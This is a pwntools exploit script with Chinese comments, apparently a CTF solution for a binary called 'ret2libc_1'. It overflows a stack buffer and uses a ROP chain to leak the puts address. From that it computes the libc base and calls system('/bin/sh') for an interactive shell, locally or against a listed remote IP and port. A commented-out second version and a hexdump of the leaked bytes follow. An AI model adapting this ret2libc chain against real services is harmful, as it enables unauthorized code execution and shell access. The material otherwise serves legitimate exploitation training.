from pwn import *

'''
写法一
通过def start()的 process(['setarch', 'x86_64', '-R', binary])，使得put地址以0x7f开头
'''
s = lambda data: io.send(data)
sa = lambda delim, data: io.sendafter(str(delim), data)
sl = lambda data: io.sendline(data)
sla = lambda delim, data: io.sendlineafter(str(delim), data)
r = lambda num: io.recv(num)
ru = lambda delims, drop=True: io.recvuntil(delims, drop)
itr = lambda: io.interactive()
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './ret2libc_1'
gdbscript = '''
'''


def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('10.5.101.125', 28015)
    else:
        return process(['setarch', 'x86_64', '-R', binary])

#patchelf --set-interpreter ./ld-linux-x86-64.so.2 --replace-needed libc.so.6 ./libc.so.6 ret2libc1
#ROPgadget --binary ./ret2libc --only "pop|ret" | grep "rdi"
elf = ELF(binary)
io = start()

# pie
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_adr = elf.symbols['main']  # 找符号表

# main_adr = 0x0401225 # offset + elf_base

pop_rdi = 0x0000000000400963  # pop rdi ; ret
ret = 0x0000000000400629  # pop rip
pay = b'a' * 0xD8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_adr)  #
sla("Please tell me:", pay)

puts_adr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  # 地址一般是0x7f开头 先输出：d0 0e c8 f7  ff 7f，因此要向后找6位，最后补齐8位
#     u64(io.recv(6).ljust(8,b'\x00'))		p64 <-> u64

print("puts_adr-->", hex(puts_adr))

libc = ELF("./libc.so.6")

libc_base = puts_adr - libc.sym['puts']  # symbol
sys_adr = libc_base + libc.sym['system']  # system(/bin/sh)
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()  # .search返回的是生成器,用next来获取第一个匹配的地址

print("libc_base-->", hex(libc_base))

# debug()

pay1 = b'a' * 0xD8 + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(sys_adr)  #system函数对齐
sla("Please tell me:", pay1)
itr()

'''

from pwn import *
#from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './ret2libc_1'
io=process(pwnfile)

elf = ELF(pwnfile)

def debug():
	gdb.attach(io)
	pause()

#debug()

pad = 0xd0
# pie
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_adr = elf.symbols['main']		# 找符号表

pop_rdi = 0x0400963		# pop rdi ; ret
pay = b'a'*pad+b'b'*8+p64(pop_rdi)+p64(puts_got)		# pop_ret
pay += p64(puts_plt)+p64(main_adr)


ret = pop_rdi + 1 # pop rip

io.sendlineafter("Please tell me:",pay)
puts_adr = u64(io.recvuntil(b'\x0a')[-7:-1].ljust(8,b'\x00'))#通过换行符向前寻找
print("puts_adr-->",hex(puts_adr))

libc = ELF("./libc.so.6")

libc_base = puts_adr-libc.sym['puts']   #symbol
sys_adr = libc_base+libc.sym['system']			#  system(/bin/sh)
bin_sh = libc_base+libc.search(b'/bin/sh').__next__()	# .search返回的是生成器,用next来获取第一个匹配的地址

print("libc_base-->",hex(libc_base))

#debug()
ret = pop_rdi + 1 #代表ret

pay1 = b'a'*pad+b'b'*8+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(sys_adr)   # 
io.sendlineafter("Please tell me:",pay1)

io.interactive()


00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
000000d0  62 62 62 62  62 62 62 62  63 09 40 d0  0e 48 7f aa  │bbbb│bbbb│c·@·│·H··│
000000e0  7e 0a 48 65  6c 6c 6f 2c  49 20 61 6d  20 61 20 63  │~·He│llo,│I am│ a c│
000000f0  6f 6d 70 75  74 65 72 20  52 65 70 65  61 74 65 72  │ompu│ter │Repe│ater│
puts_adr = u64(io.recvuntil(b'\x0a')[-7:-1].ljust(8,b'\x00'))
寻找\x0a=\n 之前6位数据，为输出的put地址


'''
